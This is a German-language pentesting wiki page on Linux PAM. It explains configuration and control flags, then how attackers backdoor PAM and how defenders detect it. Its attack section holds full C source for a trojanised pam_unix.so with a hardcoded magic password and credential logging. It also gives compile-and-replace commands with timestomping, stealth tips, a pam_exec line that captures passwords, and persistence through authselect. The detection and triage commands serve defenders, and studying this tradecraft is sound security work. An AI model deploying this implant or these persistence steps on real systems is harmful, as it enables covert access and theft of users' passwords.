# PAM - Steckbare Authentifizierungsmodule

### Grundlegende Informationen

**PAM (Pluggable Authentication Modules)** dient als Sicherheitsmechanismus, der **die Identität von Benutzern überprüft, die auf Computerdienste zugreifen möchten**, und ihren Zugriff anhand verschiedener Kriterien steuert. Es ist vergleichbar mit einem digitalen Torwächter, der sicherstellt, dass nur autorisierte Benutzer bestimmte Dienste nutzen können, während ihre Nutzung möglicherweise eingeschränkt wird, um eine Überlastung des Systems zu verhindern.

#### Konfigurationsdateien

- **Solaris** unterstützt die ältere zentrale Datei `/etc/pam.conf`, wobei aktuelle Empfehlungen Dienstdateien unter `/etc/pam.d` bevorzugen.<sup>[[10]](#references)</sup>
- **Linux-Systeme** bevorzugen einen Verzeichnisansatz und speichern dienstspezifische Konfigurationen unter `/etc/pam.d`. Die Konfigurationsdatei für den login-Dienst befindet sich beispielsweise unter `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Ein Beispiel für eine PAM-Konfiguration für den login-Dienst könnte wie folgt aussehen:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM-Verwaltungsbereiche**

Diese Bereiche oder Verwaltungsgruppen umfassen **auth**, **account**, **password** und **session**. Jeder ist für unterschiedliche Aspekte des Authentifizierungs- und Sitzungsverwaltungsprozesses zuständig:<sup>[[1]](#references)</sup>

- **Auth**: Überprüft die Benutzeridentität, häufig durch die Abfrage eines Passworts.
- **Account**: Kümmert sich um die Kontoverifizierung und prüft Bedingungen wie die Gruppenmitgliedschaft oder zeitabhängige Einschränkungen.
- **Password**: Verwaltet Passwortaktualisierungen, einschließlich Komplexitätsprüfungen und der Verhinderung von dictionary attacks.
- **Session**: Verwaltet Aktionen beim Start oder Ende einer Servicesitzung, etwa das Einhängen von Verzeichnissen oder das Festlegen von Ressourcenlimits.

#### **PAM-Modulsteuerungen**

Steuerungen legen die Reaktion des Moduls auf Erfolg oder Fehler fest und beeinflussen dadurch den gesamten Authentifizierungsprozess. Dazu gehören:<sup>[[1]](#references)</sup>

- **Required**: Der Fehler eines erforderlichen Moduls führt letztendlich zu einem Fehler, jedoch erst, nachdem alle nachfolgenden Module geprüft wurden.
- **Requisite**: Sofortige Beendigung des Prozesses bei einem Fehler.
- **Sufficient**: Wenn kein früheres `required`-Modul fehlgeschlagen ist, wird bei Erfolg sofort zurückgekehrt und die verbleibenden Module in derselben Verwaltungsgruppe werden übersprungen.
- **Optional**: Führt nur dann zu einem Fehler, wenn es das einzige Modul im Stack ist.

#### Offensive Semantics That Matter

Bei der Analyse oder Änderung von PAM bestimmt die **Position einer eingefügten Regel**, welcher Stack sie verarbeitet:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` und `substack` übernehmen Regeln aus anderen Dateien. Daher kann die Bearbeitung von `sshd` nur SSH betreffen, während die Bearbeitung von `system-auth`, `common-auth` oder eines anderen gemeinsam genutzten Stacks mehrere Services gleichzeitig beeinflusst.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM unterstützt außerdem Controls in eckigen Klammern wie `[success=1 default=ignore]`. Diese können missbraucht werden, um nach einer erfolgreichen benutzerdefinierten Prüfung **ein oder mehrere Module zu überspringen**, anstatt `pam_unix.so` sichtbar zu ersetzen.<sup>[[1]](#references)</sup>
- Der `module-path` kann **absolut** (`/usr/lib/security/pam_custom.so`) oder relativ zum standardmäßigen PAM-Modulverzeichnis sein. Auf modernen Linux-Systemen sind die tatsächlichen Verzeichnisse häufig `/lib/security`, `/lib64/security`, `/usr/lib/security` oder Multiarch-Pfade wie `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Kurze operator takeaway: Vor dem Patchen immer den **vollständigen Service-Graphen** abbilden. Beispielsweise bedeutet `sshd -> password-auth -> system-auth` auf einigen Distros oder `sshd -> system-remote-login -> system-login -> system-auth` auf anderen, dass sich dasselbe einzeilige Implantat deutlich weiter ausbreiten kann als beabsichtigt.<sup>[[1]](#references)[[13]](#references)</sup>

#### Beispielszenario

In einer Konfiguration mit mehreren auth-Modulen folgt der Prozess einer strikten Reihenfolge. Wenn das Modul `pam_securetty` feststellt, dass das Login-Terminal nicht autorisiert ist, werden Root-Logins blockiert. Aufgrund seines Status als "required" werden jedoch weiterhin alle Module verarbeitet. `pam_env` setzt Umgebungsvariablen, was möglicherweise die Benutzerfreundlichkeit verbessert. Die Module `pam_ldap` und `pam_unix` arbeiten gemeinsam an der Authentifizierung des Benutzers, wobei `pam_unix` versucht, ein zuvor übermitteltes Passwort zu verwenden, wodurch die Effizienz und Flexibilität der Authentifizierungsmethoden verbessert wird.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Ein klassischer Persistence-Trick in wichtigen Linux-Umgebungen besteht darin, die legitime PAM-Bibliothek durch ein trojanisiertes Drop-in zu **ersetzen**. Auf einem Host, dessen PAM-Stack `pam_unix.so` lädt, kann die SSH- oder Konsolen-Authentifizierung dessen Einstiegspunkt `pam_sm_authenticate()` aufrufen. Ein bösartiger Ersatz kann Anmeldedaten abfangen oder einen *magic*-Passwort-Bypass implementieren.<sup>[[2]](#references)[[11]](#references)</sup>

### Kompilierungs-Spickzettel
Die folgende Skizze verwendet den Service-Einstiegspunkt `pam_sm_authenticate()` von Linux-PAM sowie `pam_get_authtok()`, um auf das Authentifizierungstoken zuzugreifen.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Kompilieren und heimlich ersetzen (das replacement/timestomp-Muster ist von Unit 42 dokumentiert). Passe sowohl den fest im Wrapper hinterlegten Backup-Pfad als auch die folgenden Befehle an das tatsächliche PAM-Modulverzeichnis des Ziels an:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec-Tipps
1. **Atomisches Überschreiben** – schreibe eine vollständige Library in eine temporäre Datei und benenne sie an die Zielposition um, um zu vermeiden, dass ein teilweise geschriebenes Authentication-Modul zurückbleibt.
2. Ein Pfad wie `/usr/bin/.dbus.log` wurde in der AuthDoor-Analyse von Unit 42 beobachtet und ist daher ebenfalls ein nützlicher Hunting-Indikator.<sup>[[2]](#references)</sup>
3. Bewahre die vom PAM-Stack erwarteten Entry-Points (zum Beispiel `pam_sm_authenticate` und `pam_sm_setcred`), damit andere Management-Operationen weiterhin funktionieren.<sup>[[11]](#references)[[18]](#references)</sup>

### Erkennung
Bei Package-Integrity-Prüfungen überprüft RPM die Metadaten installierter Dateien, `debsums -s` meldet Checksum-Fehler und `dpkg -S` im Triage-Block fragt die Package-Ownership ab; die Audit-Watch-Syntax protokolliert Schreibvorgänge und Attributänderungen an einem Pfad.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Vergleiche MD5/SHA256 von `pam_unix.so` mit dem Distro-Package.
* Verwende `rpm -V pam` oder `debsums -s libpam-modules`, um ersetzte Libraries ohne manuelles Hashing zu erkennen.
* Prüfe auf für alle Benutzer beschreibbare Dateien oder ungewöhnliche Ownership unter `/lib/security/`.
* `auditd`-Regel: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Durchsuche PAM-Konfigurationen nach unerwarteten Modulen: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Schnelle Triage-Befehle (post-compromise oder threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Missbrauch von `pam_exec` für Persistence
Anstatt `pam_unix.so` zu ersetzen, besteht eine weniger invasive Methode darin, eine `pam_exec`-Zeile in `/etc/pam.d/sshd` anzuhängen, sodass eine diesen PAM-Eintrag erreichende Invocation einen Helper ausführt, während der normale Stack intakt bleibt.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` empfängt PAM-Metadaten in Umgebungsvariablen wie `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` und `PAM_TYPE`. Mit `expose_authtok` kann der Helper während der `auth`- oder `password`-Phasen bis zu `PAM_MAX_RESP_SIZE` Bytes des Passworts aus `stdin` lesen. Wenn der Helper mit der effektiven UID statt der realen UID ausgeführt werden soll, füge `seteuid` hinzu.<sup>[[4]](#references)</sup>

Es folgen praktische Hinweise zu den Modultypen und dem für `pam_exec` dokumentierten `type=`-Filter:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` eignet sich besser für **Aktionen nach dem Login**, etwa das erneute Öffnen von Sockets oder das Starten eines abgekoppelten Daemons.
- `auth optional pam_exec.so quiet expose_authtok ...` ist die übliche Wahl für die **Erfassung von Credentials**, da es vor dem Öffnen der Session ausgeführt wird.
- `type=session` oder `type=auth` kann verwendet werden, um die Ausführung auf eine bestimmte PAM-Phase zu beschränken und störende doppelte Ausführungen zu vermeiden.

### Überleben von Distro-Tools: `authselect`

Auf RHEL- und Fedora-Systemen, die `authselect` verwenden, können direkte Änderungen an generierten Dateien wie `/etc/pam.d/system-auth` oder `/etc/pam.d/password-auth` von **`authselect` überschrieben werden**. Für Persistenz patchen Operatoren häufig das aktive benutzerdefinierte Profil unter `/etc/authselect/custom/<profile>/` und wählen es anschließend erneut aus.<sup>[[5]](#references)[[19]](#references)</sup>

Typischer Workflow, wenn du Root-Rechte hast:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Das ist sowohl für Offense als auch für Triage relevant: Wenn `/etc/pam.d/system-auth` das Banner `Generated by authselect` und `Do not modify this file manually` enthält, kann der tatsächliche Persistence-Punkt unter `/etc/authselect/custom/` statt unter `/etc/pam.d/` liegen.<sup>[[5]](#references)</sup>

### Aktuelles Tradecraft aus der Praxis

Aktuelle Berichte aus dem Jahr 2025 über die **Plague** Linux-Backdoor zeigten dieselbe Kernidee in weiterentwickelter Form: eine schädliche PAM-Komponente mit einem **statischen Bypass-Passwort** sowie die Bereinigung von SSH-bezogenen Umgebungsvariablen und der Shell-History (`HISTFILE=/dev/null`), um nach dem Login Sitzungsspuren zu reduzieren.<sup>[[3]](#references)</sup> Das ist ein nützliches Hunting-Muster, da die Backdoor-Logik in PAM liegen kann, während die Stealth-Artefakte erst **nach** erfolgreicher Authentifizierung erscheinen.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Das Playbook des Covert Operators: Infiltration globaler Telekommunikationsnetzwerke - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Eine neu entdeckte PAM-basierte Backdoor für Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Benutzerauthentifizierung mit authselect konfigurieren - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian-Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian-Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Authentifizierung in Oracle Solaris 11.4 verwalten](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Handbuch zur Authentifizierung auf Systemebene - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu-Paketdateiliste: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian-Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Änderungen/Authselect verpflichtend machen - Fedora-Projekt-Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
